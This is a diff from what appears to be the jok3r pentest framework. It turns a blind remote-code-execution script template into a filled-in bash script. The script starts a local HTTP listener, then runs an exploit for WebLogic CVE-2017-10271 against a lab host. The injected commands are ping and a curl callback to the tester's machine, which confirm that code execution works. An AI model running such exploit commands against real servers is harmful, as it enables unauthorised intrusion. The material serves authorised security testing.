@@ -1,25 +1,18 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-###
-### Core > ScriptTemplates
-###
-
-SCRIPT_RCE_BLIND = """
 #!/usr/bin/env bash
 
-print_title() {{
+print_title() {
         BOLD=$(tput bold ; tput setaf 4)
         NORMAL=$(tput sgr0)
         echo "$BOLD $1 $NORMAL"
-}}
+}
 
-print_info() {{
+print_info() {
         BOLD=$(tput bold)
         BLUE=$(tput setaf 4)
         NORMAL=$(tput sgr0)
         echo "$BOLD$BLUE[~] $NORMAL$1 $NORMAL"
-}}
-cd {exploit_dir}
+}
+cd /home/koutto/jok3r-framework/jok3r-pocs/exploits/weblogic-cve-2017-10271
 
 sudo rm -f /tmp/dump.pcap
 sudo rm -f /tmp/httptraffic.log
@@ -33,7 +26,7 @@ print_info "Alternatively, running HTTP server (port 8888/tcp) in background to 
 PYTHONUNBUFFERED=x python3 -m http.server 8888 &> /tmp/httptraffic.log &
 sleep 2
 
-{command}
+python3 exploit-weblogic-cve-2017-10271.py -r http://10.1.1.40:7001/ --cmd '/bin/ping -c 4 192.168.1.28'; python3 exploit-weblogic-cve-2017-10271.py -r http://10.1.1.40:7001/ --cmd '/usr/bin/ping -c 4 192.168.1.28'; python3 exploit-weblogic-cve-2017-10271.py -r http://10.1.1.40:7001/ --cmd 'curl http://192.168.1.28:8888/testexploit1337'; python3 exploit-weblogic-cve-2017-10271.py -r http://10.1.1.40:7001/ --cmd 'ping /n 4 192.168.1.28'
 
 print_info "Wait a little bit..."
 sleep 5
@@ -62,5 +55,3 @@ echo
 print_info "Delete capture"
 sudo rm -f /tmp/httptraffic.log
 echo
-
-"""
